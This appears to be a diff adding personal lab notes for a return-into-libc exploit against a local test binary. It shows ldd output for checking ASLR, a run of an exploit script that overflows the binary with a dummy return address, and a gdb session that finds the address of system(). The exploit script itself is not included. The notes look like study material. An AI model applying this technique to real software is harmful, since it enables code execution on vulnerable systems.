@@ -1,0 +1,54 @@
+example of return into libc
+
+1 - check if ASLR is on 
+
+neo@matrix:~/retlibc$ ldd ./vulnerable
+#	linux-vdso.so.1 (0x00007ffff7fd3000)
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7df3000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fd5000)
+neo@matrix:~/retlibc$ ldd ./vulnerable
+	linux-vdso.so.1 (0x00007ffff7fd3000)
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7df3000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fd5000)
+neo@matrix:~/retlibc$ ldd ./vulnerable
+	linux-vdso.so.1 (0x00007ffff7fd3000)
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7df3000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fd5000)
+
+2 - run with a dummy address to check if address is reaching EIP
+
+neo@matrix:~/retlibc$ ./run.sh 
+./run.sh: line 1: warning: command substitution: ignored null byte in input
+./run.sh: line 1:  6421 Segmentation fault      (core dumped) ./vulnerable `python ./expl.py 502 0xffbbddeeaa`
+
+3 - discover where is system comand and after replace ( this exploit dont need to invert address )
+
+
+
+neo@matrix:~/retlibc$ gdb ./vulnerable 
+GNU gdb (Debian 8.2.1-2+b3) 8.2.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./vulnerable...(no debugging symbols found)...done.
+(gdb) b main
+Breakpoint 1 at 0x1149
+(gdb) r
+Starting program: /home/neo/retlibc/vulnerable 
+
+Breakpoint 1, 0x0000555555555149 in main ()
+(gdb) print &system
+$1 = (int (*)(const char *)) 0x7ffff7e3c9c0 <__libc_system>
+(gdb) 
+
